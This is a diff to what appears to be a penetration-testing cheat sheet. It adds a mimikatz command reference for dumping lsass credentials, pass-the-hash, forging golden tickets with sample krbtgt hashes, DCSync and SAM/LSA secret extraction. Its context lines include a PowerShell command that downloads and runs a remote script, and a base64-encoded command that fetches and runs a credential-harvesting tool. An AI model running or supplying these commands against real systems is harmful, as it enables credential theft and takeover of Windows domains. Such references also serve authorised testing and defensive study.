@@ -16,3 +16,67 @@ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
 
 # encoded-mimikittenz [local]
 powershell -enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcHV0dGVycGFuZGEvbWltaWtpdHRlbnovbWFzdGVyL0ludm9rZS1taW1pa2l0dGVuei5wczEnKTsgSW52b2tlLW1pbWlraXR0ZW56Cg==
+
+% mimikatz, general
+# output
+privilege::debug
+log </output/file (optional)>
+
+# sekurlsa password dump (lsass)
+sekurlsa::logonpasswords
+sekurlsa::logonPasswords full
+
+# sekurlsa ticket manipulation
+sekurlsa::tickets /export
+sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<NTLM Hash> /run:<cmd.exe>
+
+# kerberos
+kerberos::list /export
+kerberos::ptt <c:\full\path\to\ticket>
+kerberos::golden /admin:<admin username> /domain:<domain> /sid:<sid> /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:<c:\full\path\to\ticket>>
+
+#crypto
+crypto::capi
+crypto::cng
+crypto::certificates /export
+crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE
+crypto::keys /export
+crypto::keys /machine /export
+
+#vault & lsadump
+vault::cred
+vault::list
+token::elevate
+vault::cred
+vault::list
+lsadump::sam
+lsadump::secrets
+lsadump::cache
+token::revert
+lsadump::dcsync /user:<domain>\krbtgt /domain:<domain>
+
+# pass the hash (pth)
+sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<NTLM Hash> /run:cmd.exe
+
+# ekeys
+sekurlsa::ekeys
+
+# dpapi
+sekurlsa::dpapi
+
+#minidump
+sekurlsa::minidump lsass.dmp
+
+# pass the ticket (ptt)
+kerberos::ptt <username>@<domain>
+
+#golden/silver
+kerberos::golden /user:utilisateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /id:1107 /groups:513 /ticket:utilisateur.chocolate.kirbi
+kerberos::golden /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /aes256:15540cac73e94028231ef86631bc47bd5c827847ade468d6f6f739eb00c68e42 /user:Administrateur /id:500 /groups:513,512,520,518,519 /ptt /startoffset:-10 /endin:600 /renewmax:10080
+kerberos::golden /admin:Administrator /domain:CTU.DOMAIN /sid:S-1-1-12-123456789-1234567890-123456789 /krbtgt:deadbeefboobbabe003133700009999 /ticket:Administrator.kiribi
+
+#tgt
+kerberos::tgt
+
+#purge
+kerberos::purge
